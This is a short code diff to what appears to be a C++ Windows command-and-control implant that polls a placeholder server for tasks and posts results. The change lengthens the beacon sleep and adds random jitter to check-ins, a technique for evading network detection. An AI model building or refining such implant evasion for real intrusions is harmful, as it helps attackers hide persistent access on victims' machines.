@@ -9,7 +9,7 @@ every 10 secs check for tasks->if tasks exit dispatch->append to dictionary->pos
 #include <winhttp.h>
 #include <future> 
 #define SERVERNAME "placeholder"
-#define SLEEP 10
+#define SLEEP 60000
 
 size_t writeFunction(void *ptr, size_t size, size_t nmemb, std::string *data)
 {
@@ -202,7 +202,10 @@ int sendresults()
 {
     while (1)
     {
-        Sleep(SLEEP);
+        //create jitter from 0 to 5 mins 
+        int jitter;
+        jitter=rand()*10; 
+        Sleep(SLEEP+jitter);
         // Send results, check response
         // If good response break
     }
